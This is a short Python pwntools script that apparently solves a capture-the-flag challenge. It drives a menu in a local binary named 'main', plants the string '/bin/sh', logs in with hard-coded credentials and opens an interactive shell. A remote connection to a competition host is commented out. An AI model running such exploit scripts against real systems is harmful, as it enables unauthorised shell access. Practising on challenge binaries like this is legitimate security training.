from pwn import*
from ropper import RopperService
import angr
# import interactive

def cmd(c):
    io.sendlineafter(b"ch:",str(c).encode())
# ip,port=interactive.get_one(12)
# io = remote(ip,port)
io = process("./main")

cmd(2)
io.sendafter(b"leave me sth:",b'/bin/sh')
# gdb.attach(io)
cmd(1)
a = b"login_ai"
b = b"ai_robot"
io.sendlineafter(b"username:",a)
io.sendlineafter(b"passwd",b)

cmd(5)


io.interactive()
